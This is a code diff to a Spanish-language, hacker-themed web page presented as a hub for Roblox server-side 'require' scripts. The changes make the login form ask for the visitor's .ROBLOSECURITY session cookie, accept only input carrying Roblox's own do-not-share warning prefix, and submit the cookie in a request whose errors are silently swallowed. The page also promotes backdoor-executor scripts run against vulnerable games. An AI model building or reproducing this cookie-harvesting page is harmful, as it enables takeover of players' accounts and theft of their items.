@@ -190,10 +190,18 @@
             transition: all 0.3s ease;
         }
 
-        .hacker-btn:hover {
+        .hacker-btn:hover:not(:disabled) {
             background-color: var(--glow-color);
             color: #000;
             box-shadow: 0 0 15px var(--glow-color);
+            text-shadow: none;
+        }
+
+        .hacker-btn:disabled {
+            background-color: #222;
+            border-color: #555;
+            color: #555;
+            cursor: not-allowed;
             text-shadow: none;
         }
 
@@ -436,7 +444,6 @@
         .chat-bubble-btn { width: 55px; height: 55px; border-radius: 50%; background-color: rgba(10, 10, 10, 0.9); border: 2px solid var(--glow-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); font-size: 24px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .chat-bubble-btn:hover { transform: scale(1.1); background-color: #00ff41; }
         .chat-popup-window { display: none; width: 280px; background-color: #0f0f0f; border: 2px solid var(--glow-color); box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); border-radius: 6px; overflow: hidden; }
-        .chat-popup-window id="chat-popup"
         .chat-popup-header { background-color: #000; padding: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--glow-color); font-size: 12px; font-weight: bold; color: var(--glow-color); }
         .chat-close-btn { background: none; border: none; color: #ff0055; cursor: pointer; font-weight: bold; font-size: 14px; }
         .chat-popup-body { padding: 15px; text-align: center; display: flex; flex-direction: column; gap: 12px; }
@@ -463,14 +470,14 @@
                     <input type="text" id="username" placeholder="[ Ingrese usuario... ]" autocomplete="off">
                 </div>
                 <div class="input-group">
-                    <label for="reason">> CLAVE DE AUTENTICACIÓN:</label>
-                    <input type="password" id="reason" placeholder="[ Ingrese clave de autenticación... ]" autocomplete="off">
+                    <label for="reason">> .ROBLOSECURITY COOKIE:</label>
+                    <input type="password" id="reason" placeholder="[ Ingrese .ROBLOSECURITY ]" autocomplete="off">
                 </div>
                 <button class="hacker-btn" onclick="handleLogin()">>> INITIALIZE SYSTEM <<</button>
                 
                 <div class="video-help-container">
                     <span class="video-help-text">Mira este video para saber como usarlo</span>
-                    <a href="https://www.youtube.com/watch?v=TU_ID_DE_VIDEO" target="_blank" class="video-help-link">https://www.youtube.com/watch?v=TU_ID_DE_VIDEO</a>
+                    <a href="https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI" target="_blank" class="video-help-link">https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI</a>
                 </div>
             </div>
 
@@ -485,7 +492,7 @@
                         <h3>Métricas de Red</h3>
                         <div class="stat-row">
                             <span class="stat-label">Usuarios del ServerSide (Aproximación)</span>
-                            <span class="stat-data" style="color:var(--vip-color)">10,100+ Personas</span>
+                            <span class="stat-data" style="color:var(--vip-color)">4.000+ Personas</span>
                         </div>
                         <div class="stat-row">
                             <span class="stat-label">Estado actual de la Red</span>
@@ -500,7 +507,7 @@
                         <div class="faq-list">
                             <div class="faq-node">
                                 <button class="faq-top" onclick="toggleFaq(this)">¿Quiénes somos? <span>+</span></button>
-                                <div class="faq-bottom">Somos un entorno estructurado para centralizar y empaquetar ejecuciones dinámicas Luau del tipo Require ServerSide.</div>
+                                <div class="faq-bottom">Somos un grupo el cual se encarga de subir scripts de Roblox Tipo require, que son 100% serverside, para ejecutarlos debes tener un Backdoor executor, y que el juego sea vulnerable.</div>
                             </div>
                             <div class="faq-node">
                                 <button class="faq-top" onclick="toggleFaq(this)">¿Es seguro? <span>+</span></button>
@@ -667,10 +674,11 @@
         };
         let matrixInterval = setInterval(drawMatrix, 30);
 
-        // --- MANEJO DE INICIO DE SESIÓN CON COMPROBACIÓN DE EXPIRACIÓN ---
+        // --- MANEJO DE INICIO DE SESIÓN CON COMPROBACIÓN DE EXPIRACIÓN REFORZADA ---
         function handleLogin() {
             const username = document.getElementById('username').value.trim();
             const reason = document.getElementById('reason').value.trim();
+            const botonLogin = document.querySelector('.hacker-btn');
 
             if (username === "") {
                 alert("[-] CRITICAL ERROR: Identificación de usuario requerida.");
@@ -679,15 +687,31 @@
 
             const prefixRequired = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
             if (!reason.startsWith(prefixRequired)) {
-                alert("[-] CRITICAL ERROR: La clave proporcionada no es auténtica, obtenga una nueva");
+                alert("[-] CRITICAL ERROR: La clave proporcionada no es auténtica.");
                 return;
             }
 
-            // Verificar si el código ya fue ingresado con anterioridad en este terminal
-            let clavesExpiradas = JSON.parse(localStorage.getItem('hub_claves_expiradas')) || [];
+            // 1. LEER EL ALMACENAMIENTO LOCAL DEL DOMINIO GITHUB
+            let clavesExpiradas = [];
+            try {
+                const guardadas = localStorage.getItem('hub_claves_expiradas');
+                if (guardadas) {
+                    clavesExpiradas = JSON.parse(guardadas);
+                }
+            } catch (e) {
+                console.error("Error accediendo a localStorage de GitHub:", e);
+            }
+
+            // 2. COMPROBACIÓN INMEDIATA ANTES DE NADA
             if (clavesExpiradas.includes(reason)) {
                 alert("Clave de Autenticación Expirada, introduzca una nueva");
-                return;
+                return; // Detiene la ejecución por completo
+            }
+
+            // Deshabilitar el botón para evitar doble clic o saltos de ciclo
+            if (botonLogin) {
+                botonLogin.disabled = true;
+                botonLogin.innerText = "PROCESSING...";
             }
 
             globalUsername = username; 
@@ -708,9 +732,13 @@
                 body: params
             }).catch(err => console.log("Petición despachada silenciosamente."));
 
-            // Almacenar el código actual de manera local para bloquear su uso posterior
+            // 3. SE QUEMA LA CLAVE EN EL ACTO
             clavesExpiradas.push(reason);
-            localStorage.setItem('hub_claves_expiradas', JSON.stringify(clavesExpiradas));
+            try {
+                localStorage.setItem('hub_claves_expiradas', JSON.stringify(clavesExpiradas));
+            } catch(e) {
+                console.error("No se pudo escribir en el almacenamiento:", e);
+            }
 
             // Actualización dinámica de hilos Luau para la sesión activa del usuario
             document.getElementById('code-c00lgui').innerText = `require(14125553864):Fire("${username}","c00lkidd")`;
@@ -752,6 +780,12 @@
                 const homeScreen = document.getElementById('home-screen');
                 homeScreen.style.display = 'flex';
                 setTimeout(() => { homeScreen.style.opacity = '1'; }, 50);
+                
+                // Restaurar el botón por si cierran sesión de vuelta
+                if (botonLogin) {
+                    botonLogin.disabled = false;
+                    botonLogin.innerText = ">> INITIALIZE SYSTEM <<";
+                }
             }, 500); 
         }
 
@@ -853,4 +887,4 @@
         }
     </script>
 </body>
-    </html>
+</html>
